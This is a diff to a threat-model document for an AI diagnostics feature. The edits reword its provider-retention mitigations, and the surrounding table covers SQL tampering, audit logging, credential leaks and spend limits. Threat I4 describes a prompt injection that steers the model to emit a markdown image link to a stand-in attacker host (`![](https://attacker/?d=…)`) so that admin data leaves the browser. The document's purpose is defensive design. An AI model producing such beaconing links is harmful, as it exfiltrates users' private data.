@@ -134,7 +134,7 @@ flowchart TD
 | T2 | **Tampering** | TB4 | A tool query is coaxed into mutating or reading a secret table. | No model SQL; fixed typed parameterised queries; SELECT-only role on an allowlist that excludes secret tables — and, on a column-restricted relation, excludes the withheld columns at the **server**, so `SELECT "ipAddress"` and `SELECT *` both fail with `42501`; read-only txn + statement timeout (ADR-001, ADR-007). |
 | R1 | **Repudiation** | TB2 | "Who read this member's data, and were they allowed?" | One audit row per tool call: tool id, auth outcome, counts, timing, hash — retained per the audit runbook (ADR-004). |
 | I1 | **Information disclosure** | TB2 | An over-scoped admin reads finance data with only `bookings:view`. | Every tool gates on its own `area:view`, fail-closed; cross-area tools require every area (AND) (ADR-002). |
-| I2 | **Information disclosure** | TB5 | Bulk PII or a raw provider payload is shipped to the model. | Opt-in per-record PII; bounded/redacted typed excerpts only; no raw payloads; disclosure + optional zero-retention (ADR-003, ADR-004, ADR-006). |
+| I2 | **Information disclosure** | TB5 | Bulk PII or a raw provider payload is shipped to the model. | Opt-in per-record PII; bounded/redacted typed excerpts only; no raw payloads; an acknowledged provider disclosure; retention arranged with the provider on the club's account (ADR-003, ADR-004, ADR-006). |
 | I3 | **Information disclosure** | TB1/TB2 | Credentials leak via a tool, log, audit row, or answer. | Secrets are never in tool scope, never logged/audited/returned; metadata-only status (ADR-001, ADR-004). |
 | I4 | **Information disclosure** | TB7 | An injection in evidence steers the answer to embed authorized in-scope data in a markdown image/link (`![](https://attacker/?d=…)`) that the shell renders, beaconing it out of the admin's browser. | Model answer treated as untrusted output; shell renders inert text only (no auto-image, no arbitrary link, no `data:`); strict `img-src`/`connect-src` CSP blocks egress (ADR-008). |
 | D1 | **Denial of service / spend** | TB3/TB5 | A crafted question drives an unbounded tool loop or spend spike. | Dedicated fail-closed budget; per-round-trip reserve; hard loop-round/tool/timeout bounds; per-IP/admin/global limiters (ADR-005). |
@@ -242,8 +242,9 @@ Every trigger produces a structured, non-spending, non-mutating fallback
   console spend limit is an independent operational backstop where the deployment
   configures one (ADR-005).
 - **Provider-side processing.** Excerpts are processed outside NZ; mitigated by
-  disclosure, bounded/redacted excerpts, opt-in PII, and optional zero-retention
-  (ADR-004, ADR-006) — not eliminated. An owner enabling Diagnostics accepts this
+  the acknowledged disclosure, bounded/redacted excerpts, opt-in PII, and
+  whatever retention the club arranges with the provider (ADR-004, ADR-006) —
+  not eliminated. An owner enabling Diagnostics accepts this
   disclosed posture.
 - **Confusable-script role labels.** The role-label defusal
   (`src/lib/diagnostics/untrusted-text.ts`) matches the ASCII role words
